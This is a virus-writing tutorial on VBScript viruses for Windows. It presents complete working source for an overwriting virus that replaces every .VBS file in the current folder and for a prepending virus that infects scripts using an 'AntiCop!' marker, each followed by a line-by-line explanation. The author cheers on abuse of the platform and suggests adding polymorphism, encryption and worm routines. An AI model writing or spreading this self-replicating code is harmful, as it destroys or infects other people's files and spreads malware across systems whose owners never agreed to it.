<b>.Introduction</b>

    Well, welcome to the VBS part. VBS stands for Visual Basic Script which
is a scripting language for Windows. Normally you should use VBS to relieve
your work with Windows,  but as every platform created by MicroSoft you can
abuse it to write viruses. VBScript is very powerful because you can access
the registry, etc.  So well, the first native VBScript virus was written by
Lord Natas of the group CodeBreakers. You will find VBScript viruses mostly
combined with worm routines for example for mIRC or pIRCH.  The only handi-
cap in my eyes  is that you  are not able to use the Windows API system. ;(
The Windows Scripting Host is just a nice viral platform, enjoy!


<b>.Basics</b>

    Aight, first you have to install the Windows Scripting Host on your sys
tem to make  sure that the VBS files work.  You can download  the WSH files
somewhere in  the mircosoft site.  After installation,  every file with the
extension .VBS should get executed automaticly  with this scripting engine.
To make a new VBScript file just  load your Notepad or any other plain text
text editor and save the file with the extension '.VBS'. In VBS you can use
different  Sub's or Function's like in VBA,  but this routines will not get
executed if you not call them. Just take a look on my example.

 Sub VBS_Rules()
  MsgBox "This is a test"
 End Sub

    Well, if you have just this code in a VBScript file nothing will happen
if you executed it.  To make it display the Message Box you need to use one
of the two other examples.

 Call VBS_Rules
 Sub VBS_Rules()
  MsgBox "This is a test"
 End Sub

    or better use this

 MsgBox "This is a test"

    in your blank script file. This last two code pieces do really the same
and display a Message Box, just the first one has it's own Sub and the last
one has no routine and is just a command in our file without any Sub.

    To use the good  functions of VBScript you always  have to make ActiveX
communications  with Windows.  The most common ones used  in every VBScript
virus are the following.

 Set FSO = CreateObject("Scripting.FileSystemObject")

    This function creates and ActiveX communication object with the Windows
File System Object. With this you can now get access on the common file
commands like copying files, etc. Ok, that should be enough, if you still
want more information on every command VBScript offers just go and download
the papers and help files on the microsoft's site.

<b>
.The basic overwriting script</b>

    In this section you  will learn how to  write a very  basic overwriting
script virus.  I just wrote a  kind of instructional  virus for that so you
find just the basics in it.

---[ code starts here ]----------------------------------------------------

On Error Resume Next

Set FSO = CreateObject("Scripting.FileSystemObject")

For Each PossibleFile in FSO.GetFolder(".").Files
 If UCase(FSO.GetExtensionName(PossibleFile)) = "VBS" Then _
  FSO.CopyFile Wscript.ScriptFullName, PossibleFile.Name, True
Next

---[ code ends here ]------------------------------------------------------

    Now I will walk through the code for your better understanding.

---------------------------------------------------------------------------
On Error Resume Next
---------------------------------------------------------------------------

     You know this command well from VBA coding. It catches all errors that
may occure will execution of your virus.

---------------------------------------------------------------------------
Set FSO = CreateObject("Scripting.FileSystemObject")
---------------------------------------------------------------------------

    Here we set the File System Object  into our object variable 'FSO'.  We
need this object nearly the whole code.

---------------------------------------------------------------------------
For Each PossibleFile in FSO.GetFolder(".").Files
---------------------------------------------------------------------------

    Create an 'For Each' - 'Next' loop through all the files in the current
directory. With this 'FSO.GetFolder(".")' you can get the current directory
where the virus is present.

---------------------------------------------------------------------------
If UCase(FSO.GetExtensionName(PossibleFile)) = "VBS" Then _
 FSO.CopyFile Wscript.ScriptFullName, PossibleFile.Name, True
---------------------------------------------------------------------------

    In our loop, we check if the extension is equal to  'VBS'  and get sure
that the file we want to infect is a VBScript file. ;)  For the case that a
user wrote his extension this way 'vBs' or something like that, we make the
extension string upper case.  If the file is a VBScript file we copy the
viral script file and overwrite the host file.

---------------------------------------------------------------------------
Next
---------------------------------------------------------------------------

    Jump to the next file in the current directory.

    You can see that a basic overwriter in VBScript takes 4-5 lines of code
and it is not the big thing but overwriters are very lame so go on with the
appenders!

<b>
.The basic appender script</b>

    As in binary viruses,  overwriters are the worse ones.  They are so de-
structive. ;)  So one day someone thought about an  appending script virus.
Well,  here I will also you just show how to write a basic appender with no
special features like searchin in special folders or traversal routines. ;)
Well,  I did a little cheesy graphic to show you how an script appender can
look.

  .------------.               .------------.
  | Normal VBS |  -&gt; Virus -&gt;  |   Marker   |  If a virus finds a clean VBS
  `------------´               .------------.  file it will write a marker,
                               | Viral Code |  the viral code,  an end mark
                               .------------.  and last  but not  least the
                               |  End Mark  |  previous  code  of  the host
                               .------------.  into the host file.
                               | Host Code  |
                               `------------´
    As you see, very easy!

---[ code starts here ]----------------------------------------------------
 
'AntiCop!
Set FSO = CreateObject("Scripting.FileSystemObject")

Set OurFile = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
OurCode = OurFile.Read(639)
OurFile.Close

For Each PossibleFile In FSO.GetFolder(".").Files

 If Ucase(FSO.GetExtensionName(PossibleFile.Name)) = "VBS" Then

  Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 1)
  Marker = VictimFile.Read(9)
  VictimCode = Marker & VictimFile.ReadAll
  VictimFile.Close

  If Marker &lt;&gt; "'AntiCop!" Then
   Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 2)
   VictimFile.Write OurCode & VictimCode
   VictimFile.Close
  End If

 End If

Next
'-&gt;

---[ code ends here ]------------------------------------------------------

    That you now better understand what I wrote here,  I will now walk as I
always do step by step through the code.

---------------------------------------------------------------------------
'AntiCop!
---------------------------------------------------------------------------

    This string here ( 'AntiCop! ) is our infection marker. With this first
line we check if the file is already infected.  The length of our marker is
9 character, we need it later in code.

---------------------------------------------------------------------------
Set FSO = CreateObject("Scripting.FileSystemObject")
---------------------------------------------------------------------------

    Here we set the File System Object  into our object variable 'FSO'.  We
need this object nearly the whole code.

---------------------------------------------------------------------------
Set OurFile = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
OurCode = OurFile.Read(639)
OurFile.Close
---------------------------------------------------------------------------

    The next three lines of code do open the host file,  read the first 639
characters out,  which is the length of our virus and  close it afterwards.
The effective length of the virus is 639 characters and we don't really ap-
pend to code after the file, we set it at the beginning. So if we are in an
already infected file, we read our viral code, which is 639 char's long out
and leave the normal code of the file alone.

---------------------------------------------------------------------------
For Each PossibleFile In FSO.GetFolder(".").Files
---------------------------------------------------------------------------

    Create an 'For Each' - 'Next' loop through all the files in the current
directory. With this 'FSO.GetFolder(".")' you can get the current directory
where the virus is present.

---------------------------------------------------------------------------
If Ucase(FSO.GetExtensionName(PossibleFile.Name)) = "VBS" Then
---------------------------------------------------------------------------

    In our loop, we check if the extension is equal to  'VBS'  and get sure
that the file we want to infect is a VBScript file. ;)  For the case that a
user wrote his extension this way 'vBs' or something like that, we make the
extension string upper case.  If the file is a VBScript file we do the next
commands.

---------------------------------------------------------------------------
Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 1)
Marker = VictimFile.Read(9)
VictimCode = Marker & VictimFile.ReadAll
VictimFile.Close
---------------------------------------------------------------------------

    If we found a file that fits, we open it and read out the first 9 char-
acters and save it into the variable 'Marker'.  We need it later to check a
previous infection. Next, we save the contents of the variable 'Marker' and
the rest of the file into the string 'VictimCode'. Close the file after all
is done.

---------------------------------------------------------------------------
If Marker &lt;&gt; "'AntiCop!" Then
 Set VictimFile = FSO.OpenTextFile(PossibleFile.Path, 2)
 VictimFile.Write OurCode & VictimCode
 VictimFile.Close
End If
---------------------------------------------------------------------------

    Here we check if the first 9 characters  of the possible file are equal
to our marker,  if they are not we open our victim  file for writing and do
write our viral  code and the original code  of the victim file into it and
of course close it, else we do nothing.

---------------------------------------------------------------------------
End If
---------------------------------------------------------------------------

    Remember this end of our condition? Well here we go if the file was not
a VBScript file.

---------------------------------------------------------------------------
Next
---------------------------------------------------------------------------

    Jump to the next file in the current directory.

---------------------------------------------------------------------------
'-&gt;

---------------------------------------------------------------------------

    Well, this here is important,  after this marker the code of the victim
file will be stored.


    As you see,  writing an VBScript virus is not the big thing.  With this
little nice scripting language you can write Windows - only viruses and you
have really a big control over the whole Windows system. Just play around a
bit with this! A good idea would be adding polymorphism or encryption and a
worm routine. Well, just give it a try! Spotlight on JScript!
